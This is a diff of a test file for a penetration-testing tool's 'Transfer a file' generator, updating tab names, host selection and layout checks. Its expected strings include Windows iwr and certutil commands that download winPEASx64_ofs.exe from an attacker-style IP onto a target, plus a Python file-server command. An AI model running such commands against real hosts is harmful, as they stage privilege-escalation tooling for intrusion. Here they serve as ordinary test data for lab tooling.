@@ -86,9 +86,7 @@ const pre = (root: { findByText: typeof screen.findByText }, text: string) =>
   root.findByText((_, el) => el?.tagName === "PRE" && el.textContent === text);
 /** The generator once its host has loaded (it remounts when the engagement resolves). */
 const generator = async () => {
-  await vi.waitFor(() =>
-    expect(within(screen.getByRole("region", { name: "Transfer a file" })).getByRole("combobox", { name: "To host" })).toHaveDisplayValue("MS02"),
-  );
+  await vi.waitFor(() => expect(screen.getByRole("button", { name: "Fill for host: MS02" })).toBeInTheDocument());
   return screen.getByRole("region", { name: "Transfer a file" });
 };
 
@@ -110,7 +108,7 @@ describe("Transfer a file", () => {
     expect(await pre(g, "iwr -Uri http://10.10.14.9/winPEASx64_ofs.exe -OutFile C:\\Users\\Public\\winPEASx64_ofs.exe -UseBasicParsing")).toBeInTheDocument();
     expect(localStorage.getItem("raven.transfer.dir.windows")).toBe("C:\\Users\\Public");
     // Another method is another tab; the serve command stays.
-    await user.click(g.getByRole("tab", { name: "HTTP · certutil" }));
+    await user.click(g.getByRole("tab", { name: "certutil" }));
     expect(await pre(g, "certutil -urlcache -split -f http://10.10.14.9/winPEASx64_ofs.exe C:\\Users\\Public\\winPEASx64_ofs.exe")).toBeInTheDocument();
     expect(g.getByText(commandText("cd ~/tools/windows && python3 -m http.server 80"))).toBeInTheDocument();
   });
@@ -146,12 +144,12 @@ describe("Transfer a file", () => {
     const user = userEvent.setup();
     const { unmount } = mount("/arsenal?generator=transfer", EXAM);
     const g = within(await generator());
-    expect(await g.findByRole("tab", { name: "HTTP · bitsadmin" })).toBeInTheDocument();
-    expect(g.queryByRole("tab", { name: "HTTP · certutil" })).not.toBeInTheDocument();
+    expect(await g.findByRole("tab", { name: "bitsadmin" })).toBeInTheDocument();
+    expect(g.queryByRole("tab", { name: "certutil" })).not.toBeInTheDocument();
     unmount();
     // In a lab the same method is offered.
     mount("/arsenal?generator=transfer");
-    expect(await within(await generator()).findByRole("tab", { name: "HTTP · certutil" })).toBeInTheDocument();
+    expect(await within(await generator()).findByRole("tab", { name: "certutil" })).toBeInTheDocument();
     void user;
   });
 
@@ -174,10 +172,46 @@ describe("Transfer a file", () => {
     await screen.findByRole("tab", { name: "Next" });
     await user.keyboard("{Meta>}k{/Meta}");
     await user.type(await screen.findByRole("combobox", { name: "Search" }), "transfer a file");
-    const opt = await screen.findByRole("option", { name: "Transfer a file" });
+    const opt = await screen.findByRole("option", { name: /^Transfer a file/ });
     expect(opt).toBeInTheDocument();
     await user.keyboard("{Enter}");
     expect(await generator()).toBeInTheDocument();
+  });
+});
+
+describe("Transfer a file: layout", () => {
+  it("has no host control of its own: the browse chip is the one source", async () => {
+    mount("/arsenal?generator=transfer");
+    const g = within(await generator());
+    expect(g.queryByRole("combobox", { name: "To host" })).not.toBeInTheDocument();
+    expect(screen.getAllByRole("button", { name: /^Fill for host/ })).toHaveLength(1);
+  });
+
+  it("footnote never reads 'the the'", async () => {
+    useLastEngagementStore.setState({ engagementId: "e1", hostId: null });
+    mount("/arsenal?generator=transfer");
+    const g = within(await screen.findByRole("region", { name: "Transfer a file" }));
+    const note = await g.findByText(/copies the .* half/);
+    expect(note.textContent).toMatch(/copies the target half/);
+    expect(note.textContent).not.toMatch(/the the/);
+  });
+
+  it("with a host the footnote names it", async () => {
+    mount("/arsenal?generator=transfer");
+    const g = within(await generator());
+    expect((await g.findByText(/copies the .* half/)).textContent).toMatch(/copies the MS02 half/);
+  });
+
+  it("method pills are grouped under HTTP and Other with about 6 per group (the Windows HTTP group has 7)", async () => {
+    mount("/arsenal?generator=transfer");
+    const g = within(await generator());
+    await g.findAllByRole("tab");
+    const groups = g.getAllByRole("tablist");
+    expect(groups.map((x) => x.getAttribute("aria-label"))).toEqual(["HTTP methods", "Other methods"]);
+    for (const grp of groups) expect(within(grp).getAllByRole("tab").length).toBeLessThanOrEqual(7);
+    expect(within(groups[0]!).getByRole("tab", { name: "certutil" })).toBeInTheDocument();
+    expect(g.getByText("HTTP")).toBeInTheDocument();
+    expect(g.getByText("Other")).toBeInTheDocument();
   });
 });
 
